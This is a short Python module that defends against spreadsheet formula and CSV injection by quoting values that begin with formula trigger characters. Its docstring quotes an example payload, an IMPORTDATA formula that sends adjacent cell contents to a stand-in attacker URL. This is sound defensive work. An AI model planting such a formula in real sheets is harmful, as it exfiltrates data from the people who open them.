"""Spreadsheet formula / CSV injection neutralization.

Any attacker-influenced value written to a Google Sheet (or exported as CSV) with
``value_input_option="USER_ENTERED"`` is evaluated as a formula when it begins
with ``=``, ``+``, ``-``, ``@`` (or a leading tab/CR). A crafted cell such as
``=IMPORTDATA("https://attacker/?"&A1)`` then runs in the authenticated Google
session of whoever opens the sheet, exfiltrating adjacent cells. Prefixing a
single quote forces Sheets to treat the value as literal text.

Use :func:`safe_sheet_value` on every user-supplied cell before writing.
"""

FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def safe_sheet_value(value) -> str:
    """Return ``value`` as text, neutralized so a spreadsheet never evaluates it
    as a formula."""
    text = str(value or "")
    return f"'{text}" if text.startswith(FORMULA_TRIGGERS) else text
